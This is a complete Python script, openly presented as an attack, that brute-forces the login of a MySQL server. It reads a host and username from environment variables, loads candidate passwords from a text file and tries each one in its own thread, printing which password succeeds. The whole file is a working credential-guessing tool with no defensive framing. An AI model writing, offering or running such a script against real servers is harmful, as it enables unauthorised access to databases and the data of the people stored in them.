import pymysql
import threading
from dotenv import load_dotenv
import os

# Load environment variables
load_dotenv()

# Database host and username
DB_HOST = os.getenv('DB_HOST')
DB_USERNAME = os.getenv('DB_USERNAME')

def attempt_login(password):
    try:
        # Connect without specifying a database
        connection = pymysql.connect(
            host=DB_HOST,
            user=DB_USERNAME,
            password=password)
        
        with connection:
            print(f"Success with password: {password}")
            # Do something on success
            connection.close()
            return True
    except pymysql.MySQLError as error:
        print(f"Failed with password: {password}, error: {error}")
        # Handle the error or pass
    return False

def brute_force_attack(password_list):
    threads = []

    for password in password_list:
        thread = threading.Thread(target=attempt_login, args=(password,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Read password list from file
with open('password_list.txt', 'r') as file:
    passwords = [line.strip() for line in file]

# Run brute force attack
brute_force_attack(passwords)
